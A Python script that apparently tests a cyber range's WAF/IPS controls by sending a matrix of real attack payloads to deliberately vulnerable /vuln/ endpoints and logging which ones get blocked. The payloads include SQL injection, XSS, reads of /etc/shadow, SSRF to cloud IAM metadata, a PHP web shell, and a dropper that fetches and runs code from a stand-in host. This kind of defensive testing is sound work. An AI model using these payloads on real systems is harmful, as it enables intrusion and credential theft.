#!/usr/bin/env python3
"""Run a broad, safe attack simulation matrix against the cyber range service."""

import argparse
import base64
import csv
import json
import time
from urllib.error import HTTPError
from urllib.parse import quote
from urllib.request import Request, urlopen


def call(base: str, method: str, path: str, payload=None):
    data = None
    headers = {"Accept": "application/json"}
    if payload is not None:
        data = json.dumps(payload).encode("utf-8")
        headers["Content-Type"] = "application/json"
    req = Request(base.rstrip("/") + path, method=method, data=data, headers=headers)
    try:
        with urlopen(req, timeout=15) as resp:
            return resp.status, json.loads(resp.read().decode("utf-8"))
    except HTTPError as exc:
        body = exc.read().decode("utf-8", errors="ignore")
        try:
            parsed = json.loads(body)
        except Exception:
            parsed = {"raw": body}
        return exc.code, parsed


def run_matrix(base: str, source_vm: str):
    # Blocked = non-200 response. External products (WAF/IPS/CFW) do blocking;
    # the app itself returns 200 for every attack when no external control is active.
    rows = []
    def blocked_by_external(code: int) -> bool:
        return code != 200

    # ── SQL Injection ─────────────────────────────────────────────────────────
    sqli_payloads = [
        "' OR 1=1 --",
        "admin' UNION SELECT username,password_hash,email,api_key,role FROM users --",
        "' OR 'x'='x",
        "1 AND SLEEP(5) --",
        "normal-user-query",
    ]
    for p in sqli_payloads:
        code, data = call(base, "POST", "/vuln/sqli", {"q": p, "source_vm": source_vm})
        rows.append({"category": "sqli", "payload": p, "http": code, "blocked": blocked_by_external(code), "data": data})

    # ── XSS ──────────────────────────────────────────────────────────────────
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
    ]
    for p in xss_payloads:
        code, data = call(base, "POST", "/vuln/xss", {"input": p, "source_vm": source_vm})
        rows.append({"category": "xss", "payload": p, "http": code, "blocked": blocked_by_external(code), "data": data})

    # ── Path Traversal ────────────────────────────────────────────────────────
    traversal_payloads = [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../app/config.yaml",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ]
    for p in traversal_payloads:
        code, data = call(base, "POST", "/vuln/traversal", {"path": p, "source_vm": source_vm})
        rows.append({"category": "traversal", "payload": p, "http": code, "blocked": blocked_by_external(code), "data": data})

    # ── Command Injection ─────────────────────────────────────────────────────
    exec_payloads = ["id", "env", "uname -a", "netstat -tlnp", "ps aux"]
    for p in exec_payloads:
        code, data = call(base, "POST", "/vuln/exec", {"cmd": p, "source_vm": source_vm})
        rows.append({"category": "exec", "payload": p, "http": code, "blocked": blocked_by_external(code), "data": data})

    # ── Auth Bypass ───────────────────────────────────────────────────────────
    auth_cases = [
        ("admin", "wrongpassword"),
        ("admin", "' OR 1=1 --"),
        ("dbservice", "anyvalue"),
    ]
    for user, pw in auth_cases:
        code, data = call(base, "POST", "/vuln/auth", {"username": user, "password": pw, "source_vm": source_vm})
        rows.append({"category": "auth", "payload": f"{user}:{pw}", "http": code, "blocked": blocked_by_external(code), "data": data})

    # ── SSRF ──────────────────────────────────────────────────────────────────
    ssrf_targets = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role",
        "http://10.0.2.50:8500/v1/kv/",
    ]
    for u in ssrf_targets:
        code, data = call(base, "POST", "/vuln/ssrf", {"url": u, "source_vm": source_vm})
        rows.append({"category": "ssrf", "payload": u, "http": code, "blocked": blocked_by_external(code), "data": data})

    # ── File Upload ───────────────────────────────────────────────────────────
    samples = [
        ("eicar-test.com.txt", b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"),
        ("shell.php", b"<?php if(isset($_GET['cmd'])){ echo shell_exec($_GET['cmd']); } ?>"),
        ("dropper.sh", b"#!/bin/sh\nwget http://evil.local/payload -O /tmp/x ; chmod +x /tmp/x ; /tmp/x"),
        ("clean-note.txt", b"normal text"),
    ]
    for name, content in samples:
        payload = {
            "source_vm": source_vm,
            "filename": name,
            "content_base64": base64.b64encode(content).decode("ascii"),
        }
        code, data = call(base, "POST", "/vuln/upload", payload)
        rows.append({"category": "upload", "payload": name, "http": code, "blocked": blocked_by_external(code), "data": data})

    return rows


def write_csv(path: str, rows):
    with open(path, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["category", "payload", "http", "blocked"])
        w.writeheader()
        for r in rows:
            w.writerow({k: r[k] for k in ["category", "payload", "http", "blocked"]})


def main():
    parser = argparse.ArgumentParser(
        description="Cyber range attack matrix — fires real attack payloads at /vuln/ endpoints. "
                    "HTTP 200 = attack reached app (no external product blocked it). "
                    "Non-200 = external WAF/IPS/CFW blocked the request."
    )
    parser.add_argument("--target", default="http://127.0.0.1:8080")
    parser.add_argument("--source-vm", default="attacker-vm")
    parser.add_argument("--json-output", default="matrix-report.json")
    parser.add_argument("--csv-output", default="matrix-report.csv")
    args = parser.parse_args()

    rows = run_matrix(args.target, args.source_vm)
    summary = {
        "timestamp": int(time.time()),
        "total": len(rows),
        "blocked": sum(1 for r in rows if r["blocked"]),
        "allowed": sum(1 for r in rows if not r["blocked"]),
    }

    with open(args.json_output, "w", encoding="utf-8") as f:
        json.dump({"summary": summary, "results": rows}, f, indent=2)
    write_csv(args.csv_output, rows)

    print("Matrix complete")
    print(f"Total: {summary['total']}, Blocked: {summary['blocked']}, Allowed: {summary['allowed']}")
    print(f"JSON: {args.json_output}")
    print(f"CSV: {args.csv_output}")


if __name__ == "__main__":
    main()
